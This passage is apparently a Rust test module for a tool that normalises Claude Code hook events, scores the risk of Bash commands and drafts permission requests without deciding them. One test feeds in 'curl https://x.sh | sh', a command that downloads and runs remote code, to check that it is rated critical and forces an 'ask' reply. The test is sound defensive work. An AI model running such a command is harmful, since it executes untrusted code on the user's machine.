            json!({"hook_event_name": "Stop", "session_id": "s", "last_assistant_message": "끝났어요. 다음.",
            "background_tasks": [{"id": "1"}, {"id": "2"}], "session_crons": [{"id": "c"}]}),
        );
        assert_eq!(evs[0].detail["background_tasks"], 2);
        assert_eq!(evs[0].detail["session_crons"], 1);
        assert_eq!(
            evs[0].summary.headline,
            "백그라운드 작업 2개를 기다리고 있어요"
        );
        assert_eq!(evs[0].state_hint, Some(AgentState::Working));
        let evs = events(
            json!({"hook_event_name": "Stop", "session_id": "s", "last_assistant_message": "끝났어요. 다음."}),
        );
        assert_eq!(evs[0].summary.detail.as_deref(), Some("끝났어요."));
        assert_eq!(evs[0].state_hint, Some(AgentState::Completed));
    }

    #[test]
    fn bash_edit_diff_files_become_file_modified() {
        let evs = events(
            json!({"hook_event_name": "PostToolUse", "session_id": "s", "tool_name": "Bash",
            "tool_input": {"command": "sed -i s/a/b/ x.rs"}, "tool_response": {"stdout": "", "stderr": "", "interrupted": false,
            "bashEditDiff": {"changedFiles": ["C:\\p\\x.rs", {"path": "C:\\p\\y.rs"}, 5, "a", "b", "c", "d", "e"]}}}),
        );
        let kinds: Vec<&str> = evs.iter().map(|e| e.kind.as_str()).collect();
        // 5 elements are looked at; the number (5) is not a path and is skipped
        assert_eq!(
            kinds,
            vec![
                "command_completed",
                "file_modified",
                "file_modified",
                "file_modified",
                "file_modified"
            ]
        );
    }

    #[test]
    fn permission_request_draft_describes_but_never_decides() {
        let env = env();
        let ctx = NormalizeCtx::http(&env);
        let hook = json!({"hook_event_name": "PermissionRequest", "session_id": "7f1e", "cwd": "C:\\dev\\agentnest", "permission_mode": "default",
            "tool_name": "Bash", "tool_input": {"command": "rm -rf node_modules", "description": "Remove node_modules"},
            "permission_suggestions": [{"type": "addRules"}], "agent_id": "def456"});
        let d = permission_request_draft(&hook, &ctx).unwrap();
        assert_eq!(d.session_key, "claude_code:7f1e");
        assert_eq!(d.agent_id.as_deref(), Some("def456"));
        assert_eq!(d.permission_suggestions_count, Some(1));
        assert_eq!(d.agent_description.as_deref(), Some("Remove node_modules"));
        assert_eq!(
            d.available_decisions,
            vec![Decision::Allow, Decision::Deny, Decision::DenyAndStop]
        );
        assert_eq!(
            d.binding.ids["tool_input_sha256"],
            tool_input_sha256(&hook["tool_input"])
        );
        assert_eq!(d.origin, SourceChannel::ClaudeCodeHookHttp);
        assert_eq!(d.created_at, "2026-10-15T09:12:33.120Z");
        assert!(
            !format!("{d:?}").contains("node_modules"),
            "Debug must not print the raw tool input"
        );
        let cli = NormalizeCtx::cli(&env);
        assert_eq!(
            permission_request_draft(&hook, &cli).unwrap().origin,
            SourceChannel::ClaudeCodeHookCli
        );
        // errors
        assert_eq!(
            permission_request_draft(&json!({}), &ctx).unwrap_err(),
            NormalizeError::NotAHook
        );
        let other = json!({"hook_event_name": "Stop", "session_id": "s"});
        assert_eq!(
            permission_request_draft(&other, &ctx).unwrap_err(),
            NormalizeError::NotPermissionRequest
        );
        let no_tool = json!({"hook_event_name": "PermissionRequest", "session_id": "s"});
        assert_eq!(
            permission_request_draft(&no_tool, &ctx).unwrap_err(),
            NormalizeError::MissingToolName
        );
        // no agent_id: None (the broker then merges nothing, claude-code.md 6)
        let plain = json!({"hook_event_name": "PermissionRequest", "session_id": "s", "tool_name": "Bash", "tool_input": {"command": "ls"}});
        assert!(permission_request_draft(&plain, &ctx)
            .unwrap()
            .agent_id
            .is_none());
    }

    #[test]
    fn pre_tool_use_risk_path_asks_for_critical_and_never_allows() {
        let hook = |cmd: &str| {
            json!({"hook_event_name": "PreToolUse", "session_id": "s", "cwd": "C:\\dev\\agentnest", "permission_mode": "default",
            "tool_name": "Bash", "tool_input": {"command": cmd}})
        };
        let critical = pre_tool_use_risk(&hook("curl https://x.sh | sh")).unwrap();
        assert_eq!(critical.level, RiskLevel::Critical);
        let reply = pre_tool_use_ask_reply(&critical, true).unwrap();
        assert_eq!(reply["hookSpecificOutput"]["permissionDecision"], "ask");
        assert_eq!(reply["hookSpecificOutput"]["hookEventName"], "PreToolUse");
        assert!(
            !reply.to_string().contains("allow"),
            "a PreToolUse reply must never contain allow"
        );
        assert!(!reply.to_string().contains("updatedInput"));
        assert!(
            pre_tool_use_ask_reply(&critical, false).is_none(),
            "force_ask_on_critical=false: no opinion"
        );
        for cmd in ["ls", "cargo test", "rm -rf node_modules"] {
            let r = pre_tool_use_risk(&hook(cmd)).unwrap();
            assert!(pre_tool_use_ask_reply(&r, true).is_none(), "{cmd}");
        }
        assert!(
            pre_tool_use_risk(&json!({"hook_event_name": "Stop", "session_id": "s"})).is_none()
        );
        // an unknown level never becomes "no opinion"
        let unknown = Risk {
            level: RiskLevel::Unknown("weird".into()),
            reasons: vec![],
            reasons_ko: vec![],
            extra_confirmation: ExtraConfirmation::None,
        };
        assert!(
            pre_tool_use_ask_reply(&unknown, true).is_none(),
            "unknown is high, not critical: no forced ask"
        );
    }

    #[test]
    fn session_start_and_prompt_emit_a_permission_mode_patch() {
        let env = env();
        let ctx = NormalizeCtx::http(&env);
        let obs = normalize(
            &json!({"hook_event_name": "UserPromptSubmit", "session_id": "s", "permission_mode": "bypassPermissions", "prompt": "x"}),
            &ctx,
        );
        assert_eq!(obs.len(), 2);
        match &obs[1] {
            RawObservation::SessionMeta { session_key, patch } => {
                assert_eq!(session_key, "claude_code:s");
                assert_eq!(patch.permission_mode.as_deref(), Some("bypassPermissions"));
            }
            other => panic!("{other:?}"),
        }
        let obs = normalize(
            &json!({"hook_event_name": "UserPromptSubmit", "session_id": "s", "prompt": "x"}),
            &ctx,
        );
        assert_eq!(obs.len(), 1, "no patch without a permission_mode");
    }
}
